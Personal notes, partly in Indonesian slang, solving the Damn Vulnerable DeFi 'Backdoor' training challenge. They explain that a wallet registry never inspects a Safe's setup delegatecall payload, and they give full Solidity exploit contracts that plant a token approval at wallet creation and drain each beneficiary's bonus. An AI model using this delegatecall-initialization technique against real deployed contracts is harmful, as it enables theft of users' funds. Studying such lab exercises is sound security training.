# Backdoor Notes(wrote by myself)
- related files: src/backdoor/WalletRegistry.sol,test/backdoor/Backdoor.t.sol
---
### 1. Bug = registry checks WHO the wallet is, never WHAT it runs at birth (Safe setup to/data backdoor)

### 2. where? =
- damn-vulnerable-defi/src/backdoor/WalletRegistry.sol (67-122) `proxyCreated`

### 3. leaks reason?
- Registry pays 10 DVT to a freshly-created Safe when its owner is a beneficiary (alice/bob/charlie/david).
- It carefully validates the wallet's *identity*: right factory, right singleton, threshold==1, 1 owner, owner is a beneficiary, fallbackManager==0.
- But a Safe's `setup()` has a built-in "first-day order": params `to` + `data` → the box does a `delegatecall(to, data)` the instant it's born. The registry NEVER inspects those.
- The 10 DVT goes to the WALLET address, not to alice's EOA. And I'M the one who builds the wallet, so I pick its startup order.
- analogy: toko kasih bonus ke "kotak baru punya alice". gw yg bikin kotaknya, jadi gw selipin catatan hari-pertama: "pas lahir, kasih kunci cadangan ke gw (approve)". registry cuma ngecek nameplate "alice", gak baca catatannya.
```solidity
    function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
        // ...checks: msg.sender==factory, singleton==copy, selector==Safe.setup,
        //    threshold==1, owners.length==1, owner is beneficiary, fallbackManager==0...
        // NOTHING checks the setup's `to`/`data` (the delegatecall payload)

        // Pay tokens to the newly created wallet
        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT); // 10 DVT -> the box
    }
```

### 4. how we breach it :
```solidity
// helper: box delegatecalls this at birth -> runs in box context -> box approves attacker.
// MUST be a separately-deployed contract (has code). delegatecall-ing into the attacker
// while it's still in its own constructor = no code yet = revert GS002.
contract BackdoorModule {
    function approveToken(address token, address spender) external {
        DamnValuableToken(token).approve(spender, 10e18);
    }
}

contract BackdoorAttacker {
    // all in constructor = player's SINGLE allowed tx (vm.getNonce(player)==1)
    constructor(address[] memory users, SafeProxyFactory factory, address singletonCopy,
                WalletRegistry registry, DamnValuableToken token, address recovery) {
        BackdoorModule module = new BackdoorModule();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];                 // nameplate = beneficiary -> check passes

            // startup order: approveToken(token, attacker)
            bytes memory planting =
                abi.encodeWithSelector(BackdoorModule.approveToken.selector, address(token), address(this));

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners, uint256(1),
                address(module),      // to = delegatecall target
                planting,             // data = the backdoor approve
                address(0),           // fallbackHandler = 0 (registry checks it)
                address(0), uint256(0), payable(address(0))
            );

            // build box + fire registry callback (drops 10 DVT into the box)
            SafeProxy proxy = factory.createProxyWithCallback(singletonCopy, initializer, i, registry);

            // box already approved us during setup -> pull its 10 DVT to recovery
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
```

### 5. related shit (bonus) :
- Real-world: proxy/init exploits are a whole class. The `delegatecall` during init is the same primitive behind the Parity multisig wallet freeze (2017, ~$150M+ locked) — an uninitialized/attacker-triggered delegatecall to a library.
- Lesson: when a contract accepts user-supplied init data that triggers a delegatecall, validating the *shape* of the config is not enough — the *side effects* of init are the attack surface.
- Debug gotcha learned: delegatecall needs DEPLOYED code at the target; a contract has no runtime code at its address until its constructor finishes (GS002).
